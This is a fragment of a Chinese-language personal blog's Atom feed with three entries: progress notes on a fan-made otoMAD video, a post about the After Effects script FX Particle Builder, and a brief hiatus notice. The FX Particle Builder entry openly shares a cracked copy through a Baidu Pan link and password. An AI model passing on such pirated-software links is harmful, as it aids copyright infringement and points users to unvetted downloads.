    <link href="https://www.xtxtmtxtx.xyz/articles/%E5%A4%A9%E5%9D%91%E9%A2%84%E5%91%8Ax/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/天坑预告x/</id>
    <published>2016-07-08T16:00:00.000Z</published>
    <updated>2019-02-26T15:57:40.722Z</updated>
    <content type="html"><![CDATA[<p>没错，这个坑就是Calamity Fortune(<br>
<a href="http://www.bilibili.com/video/av5258712/" target="_blank" rel="external">av5258712</a><br>
终于是填完了啊,最后的部分做得有点不像= =<br>
但不管怎么说断断续续做了半年(orz)的坑终于做完了还是非常高兴的ww</p>
<p>虽然说确实是<del>心血来潮</del>想要还原原PV的(<a href="http://www.bilibili.com/video/av1369660/" target="_blank" rel="external">av1369660</a>)<br>
不过遇到了各种各样的问题所以进度缓慢<del>(就是因为懒)</del><br>
所以特地在这里记录一下进度x</p>
<hr>
<blockquote>
<p>总长<code>02:13</code></p>
</blockquote>
<blockquote>
<p>音频</p>
<blockquote>
<p>已完成</p>
</blockquote>
</blockquote>
<blockquote>
<p>PV</p>
<blockquote>
<p>00:10<code>16-1-21</code>(是的没错只有10s)<br>
00:21<code>16-1-25</code><br>
00:26<code>16-2-09</code>(可能会弃坑x)<br>
00:33<code>16-2-17</code><br>
00:46<code>16-5-08</code><br>
01:15<code>16-7-02</code>(总算是填了一半了)<br>
完成<code>16-7-09</code></p>
</blockquote>
</blockquote>
<p><del>什么时候完成嘛,应该明年元旦就能做完了</del></p>
<hr>
<blockquote>
<p>顺带一提勾师傅也在做哦,反正我是达不到他那种高度了的。。</p>
</blockquote>
<hr>
<p>最后感谢各位前辈对我的帮助w</p>
<hr>
<p>有什么建议的话评论哦ww</p>
<hr>
<p>缩略图(<del>**的既视感</del>):<br>
<img src="https://ooo.0o0.ooo/2016/07/08/578050f883711.jpg" alt="Finish.mov.jpg"></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>没错，这个坑就是Calamity Fortune(<br>
<a href="http://www.bilibili.com/video/av5258712/" target="_blank" rel="external">av5258712</a><br>
终于是填完了啊]]>
    </summary>
    
      <category term="音MAD" scheme="https://www.xtxtmtxtx.xyz/tags/%E9%9F%B3MAD/"/>
    
      <category term="Video" scheme="https://www.xtxtmtxtx.xyz/categories/Video/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[FX Particle Builder]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/FX%20Particle%20Builder/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/FX Particle Builder/</id>
    <published>2016-05-14T05:34:00.000Z</published>
    <updated>2018-12-26T09:50:03.814Z</updated>
    <content type="html"><![CDATA[<p>FX Particle Builder是用于动画设计和视觉特效专业人士的基本需求的脚本工具。里面含有一个粒子预设库，您可以用最快和最简单的方式来创建火，尘爆，魔术，烟雾，火花，火焰或玻璃粒子。</p>
<a id="more"></a>
<p><img src="https://ooo.0o0.ooo/2016/05/14/5736c847a509f.jpg" alt="Inline FXPB.jpg"></p>
<p><img src="https://ooo.0o0.ooo/2016/05/14/5736c847eda9e.gif" alt="01.gif"></p>
<p><img src="https://ooo.0o0.ooo/2016/05/14/5736c82ba4f3f.gif" alt="02.gif"></p>
<p><img src="https://ooo.0o0.ooo/2016/05/14/5736c82fd9c21.png" alt="02.png"></p>
<p><img src="https://ooo.0o0.ooo/2016/05/14/5736c832b0343.gif" alt="03.gif"></p>
<p><img src="https://ooo.0o0.ooo/2016/05/14/5736c8370c708.png" alt="03.png"></p>
<p><img src="http://demo.pixflow.net/promo/video/FXPB/04.gif" alt="04.gif"></p>
<p><img src="https://ooo.0o0.ooo/2016/05/14/5736c82c2b7c2.png" alt="05.png"></p>
<hr>
<p>因为之前找的时候发现大部分破解版要下载的话都很麻烦，找了半天才找到这个，所以就拿来分享一下ww<br>
这个是需要Particular插件的，而且最好是英文版<br>
还有一些简介搜一下&quot;FX Particle Builder&quot;就有了<del>(懒得贴)</del></p>
<hr>
<p>下载链接：<a href="http://pan.baidu.com/s/1i5nS3Pz" target="_blank" rel="external">http://pan.baidu.com/s/1i5nS3Pz</a> 密码：0m17</p>
<hr>
<p>原帖地址:<a href="http://tieba.baidu.com/p/4421323407" target="_blank" rel="external">http://tieba.baidu.com/p/4421323407</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>FX Particle Builder是用于动画设计和视觉特效专业人士的基本需求的脚本工具。里面含有一个粒子预设库，您可以用最快和最简单的方式来创建火，尘爆，魔术，烟雾，火花，火焰或玻璃粒子。</p>]]>
    
    </summary>
    
      <category term="AE" scheme="https://www.xtxtmtxtx.xyz/tags/AE/"/>
    
      <category term="Video" scheme="https://www.xtxtmtxtx.xyz/categories/Video/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[==]]></title>
    <link href="https://www.xtxtmtxtx.xyz/articles/==/"/>
    <id>https://www.xtxtmtxtx.xyz/articles/==/</id>
    <published>2016-04-09T12:19:00.000Z</published>
    <updated>2018-10-23T12:10:50.947Z</updated>
    <content type="html"><![CDATA[<p>由于学业变重加之现在我住宿了<del>(懒)</del><br>
所以各种坑之类的只有到暑假才能填了<br>
<del>写这个只是为了表示我还活着x</del></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>由于学业变重加之现在我住宿了<del>(懒)</del><br>
所以各种坑之类的只有到暑假才能填了<br>
<del>写这个只是为了表示我还活着x</del></p>
]]>
    </summary>
    
      <category term="杂" scheme="https://www.xtxtmtxtx.xyz/tags/%E6%9D%82/"/>
    
      <category term="Others" scheme="https://www.xtxtmtxtx.xyz/categories/Others/"/>
    
  </entry>
  
</feed>
